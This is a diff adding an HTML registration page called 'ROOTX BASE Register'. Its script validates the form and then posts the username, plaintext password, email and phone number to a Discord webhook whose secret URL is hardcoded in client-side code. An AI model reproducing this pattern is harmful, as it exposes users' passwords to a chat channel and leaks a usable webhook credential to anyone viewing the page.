@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ROOTX BASE Register</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f8ff; /* light blue */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .register-box {
+      background: white;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      width: 350px;
+    }
+    .register-box h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #003366;
+    }
+    .register-box input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+    .register-box button {
+      width: 100%;
+      padding: 10px;
+      background: #007bff;
+      border: none;
+      color: white;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .register-box button:hover {
+      background: #0056b3;
+    }
+    .msg {
+      margin-top: 10px;
+      text-align: center;
+      font-weight: bold;
+    }
+    .timer {
+      margin-top: 15px;
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+      color: #d9534f;
+    }
+  </style>
+</head>
+<body>
+  <div class="register-box">
+    <h2>ROOTX BASE REGISTER</h2>
+    <input type="text" id="username" placeholder="Set Username" required>
+    <input type="password" id="password" placeholder="Set Password" required>
+    <input type="email" id="email" placeholder="Set Email " required>
+    <input type="text" id="phone" placeholder="Phone Number (optional)">
+    <button onclick="register()">Register</button>
+    <div id="message" class="msg"></div>
+    <div id="timer" class="timer"></div>
+  </div>
+
+  <script>
+    let countdown;
+
+    async function register() {
+      const user = document.getElementById("username").value.trim();
+      const pass = document.getElementById("password").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const phone = document.getElementById("phone").value.trim();
+      const msg = document.getElementById("message");
+      const timerEl = document.getElementById("timer");
+
+      // Email validation (at least 7 chars before @gmail.com)
+      const emailRegex = /^[a-zA-Z0-9._%+-]{7,}@gmail\.com$/;
+      if (!emailRegex.test(email)) {
+        msg.textContent = "⚠ Email must be at least 7 letters + @gmail.com";
+        msg.style.color = "red";
+        return;
+      }
+
+      // Phone validation (10 digits only if provided)
+      if (phone && !/^\d{10}$/.test(phone)) {
+        msg.textContent = "⚠ Phone must be 10 digits only";
+        msg.style.color = "red";
+        return;
+      }
+
+      if (!user || !pass) {
+        msg.textContent = "⚠ Please fill Username and Password";
+        msg.style.color = "red";
+        return;
+      }
+
+      const payload = {
+        content: `📢 **NEW REGISTRATION REQUEST**\n\n👤 Username: ${user}\n🔑 Password: ${pass}\n📧 Email: ${email}\n📱 Phone: ${phone || "Not Provided"}\n\n⏳ Please verify within 10 minutes.`
+      };
+
+      try {
+        const res = await fetch("https://canary.discord.com/api/webhooks/1414621823542235246/3R895E9DQd1poWPh73OVtnLKj11nP4UYxsgFY0QhU8v-4pVTsY9IWM55nI95vV5vLNTM", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (res.ok) {
+          msg.textContent = "✅ Registration submitted! Wait for admin verification.";
+          msg.style.color = "green";
+
+          // Start 10-minute countdown (600 seconds)
+          startCountdown(600, timerEl);
+
+        } else {
+          msg.textContent = "❌ Failed to send registration!";
+          msg.style.color = "red";
+        }
+      } catch (error) {
+        msg.textContent = "⚠ Error connecting to Discord!";
+        msg.style.color = "red";
+        console.error(error);
+      }
+    }
+
+    function startCountdown(seconds, timerEl) {
+      clearInterval(countdown);
+      countdown = setInterval(() => {
+        let min = Math.floor(seconds / 60);
+        let sec = seconds % 60;
+        timerEl.textContent = `${String(min).padStart(2, '0')}:${String(sec).padStart(2, '0')}`;
+
+        if (seconds <= 0) {
+          clearInterval(countdown);
+          timerEl.textContent = "⏰ Time expired!";
+          window.location.href = "login.html"; // Redirect after time ends
+        }
+        seconds--;
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
